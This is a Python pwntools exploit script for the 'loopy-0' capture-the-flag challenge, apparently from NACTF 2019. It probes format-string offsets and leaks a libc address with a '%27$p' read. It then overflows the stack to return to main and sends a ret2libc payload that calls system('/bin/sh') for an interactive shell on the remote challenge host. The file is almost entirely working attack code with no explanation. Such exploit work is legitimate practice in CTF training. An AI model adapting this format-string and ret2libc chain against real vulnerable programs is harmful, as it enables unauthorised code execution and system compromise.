from pwn import *

binary = ELF("./loopy-0")

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        #p = remote("shell.2019.nactf.com", 31283)
        p = process("./loopy-0")
        print "Offset number {}".format(x)

        payload = ""
        #payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("You typed: ")
        stack_value = p.recv()
        if stack_value.find("637") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = remote('shell.2019.nactf.com', 31283)
    #p = process("./loopy-0")
    main = binary.symbols["main"]

    payload = ""
    payload += "%27$p"
    payload += "A" * 71
    payload += p32(main)

    #libc = ELF("libc6_2.23-0ubuntu10_i386.so")
    libc = ELF("newlibc.so.6")
    #gdb.attach(p, '''
    #            b *main+54
    #            c
    #            ''')

    p.sendline(payload)
    p.recvuntil("You typed: ")
    libc_leak = int(p.recv(10), 16)
    log.info("Libc leak : 0x{0:x}".format(libc_leak))
    libc_base = libc_leak - 0x1ab41 #libc remote 2.28 asw
    log.info("Libc base : 0x{0:x}".format(libc_base))
    libc_system = libc_base + libc.symbols["system"]
    log.info("Libc system : 0x{0:x}".format(libc_system))
    libc_bin_sh = libc_base + libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : 0x{0:x}".format(libc_bin_sh))

    payload = ""
    payload += "A" * 76
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_bin_sh)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()